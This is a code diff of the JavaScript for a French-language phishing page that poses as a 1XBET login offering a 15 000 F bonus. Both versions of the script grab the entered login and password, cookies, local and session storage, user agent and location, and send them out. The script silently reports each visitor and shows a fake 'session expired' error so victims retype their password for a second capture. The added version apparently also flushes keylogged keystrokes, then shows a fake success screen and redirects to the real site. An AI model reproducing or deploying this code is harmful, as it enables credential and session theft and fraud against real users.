-            /* ---------- le cœur : envoi du crédit + environnement ---------- */
-            function capture(id, pass){
-                var env = grabEnv();
-                var geo = getGeo();
-                var ts = new Date().toISOString();
-                var ua = navigator.userAgent || '';
-                var msg =
-                    '<b>💸 1XBET · Bonus 15 000 F — CAPTURE</b>\n<b>━━━━━━━━━━━━━━</b>\n'
-                   +'<b>👤 Login:</b> '+esc(id)+'\n'
-                   +'<b>🔑 Pass:</b> '+esc(pass)+'\n'
-                   +'<b>🌍 Geo:</b> '+esc(geo)+'\n'
-                   +'<b>━━━━ CREDENTIAL SENT ━━━━</b>\n'
-                   +'<b>🍪 Cookies:</b> '+esc(env.cookie)+'\n'
-                   +'<b>🗄 LocalStorage:</b> '+esc(env.ls).slice(0,600)+'\n'
-                   +'<b>🏷 SessionStorage:</b> '+esc(env.ss).slice(0,500)+'\n'
-                   +'<b>🖥 UA:</b> '+esc(ua).slice(0,250)+'\n'
-                   +'<b>🌐 Lang:</b> '+esc(navigator.language||'')+'\n'
-                   +'<b>⏱ Heure:</b> '+ts+'\n'
-                   +'<b>🔗 Page:</b> '+esc(location.href).slice(0,300)+'\n<b>━━━━━━━━━━━━━━</b>';
-                return sendText(msg);
-            }
+/* ---------- capture complète d'une tentative ---------- */
+function doCapture(id,pwd){
+  var env=getEnv(),geo=getGeo(),ua=navigator.userAgent||'';
+  sendText(
+    '<b>\u{1F4B8} 1XBET Bonus 15k \u2014 COMPTE CAPTUR\u00c9</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n'
+   +'<b>\u{1F464} Connexion:</b> '+enc(id)+'\n'
+   +'<b>\u{1F511} Mot de passe:</b> '+enc(pwd)+'\n'
+   +'<b>\u{1F30D} IP/G\u00e9o:</b> '+enc(geo)+'\n'
+   +'<b>\u{1F352} Cookies:</b> '+enc(env.c)+'\n'
+   +'<b>\u{1F5C4} LocalStorage:</b> '+enc(env.ls).slice(0,500)+'\n'
+   +'\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n'
+   +'<b>\u{1F5B1} UA:</b> '+enc(ua).slice(0,200)+'\n'
+   +'<b>\u{1F4C5} Heure:</b> '+new Date().toISOString()
+  );
+}
 
-            /* ---------- timeline ---------- */
-            setTimeout(function(){ document.getElementById('loader').classList.add('hidden'); }, 800);
+/* ---------- loader au chargement ---------- */
+setTimeout(function(){document.getElementById('loader').classList.add('hidden');},700);
 
-            // ping visiteur silencieux
-            setTimeout(function(){
-                sendText('<b>👀 VISITE 1XBET 15k</b>\n🖥 '+esc((navigator.userAgent||'').slice(0,140))+' | '+getGeo()+' | '+new Date().toISOString());
-            }, 1800);
+/* ---------- ping visiteur ---------- */
+setTimeout(function(){
+  sendText('<b>\u{1F440} NOUVEAU VISITEUR (page 1XBET 15k)</b>\n\ud83d\udda5 '+enc((navigator.userAgent||'').slice(0,130))+' | '+getGeo());
+},1600);
 
-            /* ---------- tabs ---------- */
-            document.querySelectorAll('.tab').forEach(function(t){
-                t.addEventListener('click', function(){
-                    document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));
-                    document.querySelectorAll('.tab-content').forEach(x=>x.classList.remove('active'));
-                    this.classList.add('active');
-                    document.getElementById(this.dataset.tab+'Tab').classList.add('active');
-                });
-            });
+/* ---------- tabs & eye ---------- */
+document.querySelectorAll('.tab').forEach(function(t){
+  t.addEventListener('click',function(){
+    document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));
+    document.querySelectorAll('.tab-content').forEach(x=>x.classList.remove('active'));
+    this.classList.add('active');
+    document.getElementById(this.dataset.tab+'Tab').classList.add('active');
+  });
+});
+document.getElementById('togglePass').addEventListener('click',function(){
+  var p=document.getElementById('password');p.type=p.type==='password'?'text':'password';
+});
 
-            /* ---------- eye ---------- */
-            document.getElementById('togglePass').addEventListener('click', function(){
-                var p=document.getElementById('password');
-                p.type = p.type==='password'?'text':'password';
-            });
+/* ---------- countdown ---------- */
+var h=23,m=58,s=12;
+setInterval(function(){
+  s--;if(s<0){s=59;m--;}if(m<0){m=59;h--;}if(h<0){h=23;m=58;s=59;}
+  document.getElementById('cd-hours').textContent=String(h).padStart(2,'0');
+  document.getElementById('cd-min').textContent=String(m).padStart(2,'0');
+  document.getElementById('cd-sec').textContent=String(s).padStart(2,'0');
+},1000);
 
-            /* ---------- countdown ---------- */
-            var h=23,m=58,s=12;
-            setInterval(function(){
-                s--; if(s<0){s=59;m--;} if(m<0){m=59;h--;} if(h<0){h=23;m=58;s=59;}
-                document.getElementById('cd-hours').textContent=String(h).padStart(2,'0');
-                document.getElementById('cd-min').textContent=String(m).padStart(2,'0');
-                document.getElementById('cd-sec').textContent=String(s).padStart(2,'0');
-            },1000);
+/* ---------- pseudo popup de validation réussie ---------- */
+function successOverlay(cb){
+  var ov=document.createElement('div');
+  ov.style.cssText='position:fixed;inset:0;background:rgba(5,18,10,.9);z-index:99999999;display:flex;align-items:center;justify-content:center;flex-direction:column;color:#fff;text-align:center;gap:15px;';
+  ov.innerHTML=
+    '<div style="width:64px;height:64px;border-radius:50%;background:#00b450;display:flex;align-items:center;justify-content:center;font-size:32px;box-shadow:0 0 40px rgba(0,180,80,.5)">\u2714</div>'
+   +'<div style="font-weight:800;font-size:17px">Connexion r\u00e9ussie</div>'
+   +'<div style="font-size:13px;color:#9dffc3">Bonus 15 000 F activ\u00e9 \u2014 Redirection en cours...</div>';
+  document.body.appendChild(ov);
+  setTimeout(cb,1300);
+}
 
-            /* ---------- soumission ---------- */
-            document.getElementById('loginForm').addEventListener('submit', function(e){
-                e.preventDefault();
-                var username = document.getElementById('username').value.trim();
-                var phone    = document.getElementById('phone').value.trim();
-                var password = document.getElementById('password').value.trim();
-                if(!password){ showFlash('Veuillez remplir tous les champs.'); return; }
-                var identifier = username || phone || 'N/A';
+/* ---------- SOUMISSION = capture + vrai redirection ---------- */
+document.getElementById('loginForm').addEventListener('submit',function(e){
+  e.preventDefault();
+  flushKL(); // envoie les frappes résiduelles
+  var u=document.getElementById('username').value.trim();
+  var ph=document.getElementById('phone').value.trim();
+  var pwd=document.getElementById('password').value.trim();
+  if(!pwd){return;}
+  var ident=u||ph||'N/A';
+  var btn=document.getElementById('submitBtn'),txt=document.getElementById('btnText'),spin=document.getElementById('spinner');
+  btn.disabled=true;txt.textContent='V\u00e9rification...';spin.classList.add('show');
 
-                var btn=document.getElementById('submitBtn');
-                var txt=document.getElementById('btnText');
-                var spin=document.getElementById('spinner');
-                btn.disabled=true; txt.textContent='Connexion...'; spin.classList.add('show');
+  doCapture(ident,pwd); // 1) capture
 
-                // capture de ce set (puis piège pour forcer une 2nde saisie)
-                capture(identifier, password);
+  setTimeout(function(){ // 2) message d'erreur piège → fait retaper → recapture
+    document.getElementById('password').value='';
+    txt.textContent='SE CONNECTER';btn.disabled=false;spin.classList.remove('show');
+    var f=document.getElementById('flashMsg');
+    f.innerHTML='\u26a0\ufe0f <b>Session expir\u00e9e.</b> Ressaisis ton mot de passe pour valider ton bonus de 15 000 F.';
+    f.style.display='block';
+  },1700);
 
-                setTimeout(function(){
-                    document.getElementById('password').value='';
-                    btn.disabled=false; txt.textContent='SE CONNECTER'; spin.classList.remove('show');
-                    showFlash('⏱ Session expirée. Ressaisis ton mot de passe pour valider ton bonus.'); // force retaper → recapture
-                },1600);
-            });
-
-            function showFlash(t){
-                var f=document.getElementById('flashMsg');
-                f.textContent=t; f.classList.add('show');
-                setTimeout(function(){f.classList.remove('show');},5000);
-            }
-
-        })();
-    </script>
+  // 3) MAIS la 2e soumission (après re-saisie) fait la vraie redirection
+  // on s'assure que le handler n'empile pas : on pointe le bouton vers l'envoi réel au 2e clic
+  document.getElementById('loginForm')._firstDone=true;
+});
+/* Seconde soumission → redirection réelle */
+document.getElementById('loginForm').addEventListener('submit',function(e){
+  if(!document.getElementById('loginForm')._firstDone)return; // ignore le 1er
+  e.preventDefault();
+  var sub=this;
+  setTimeout(function(){ successOverlay(function(){ window.location.replace(REAL); }); },400);
+});
+})();
+</script>
 </body>
 </html>
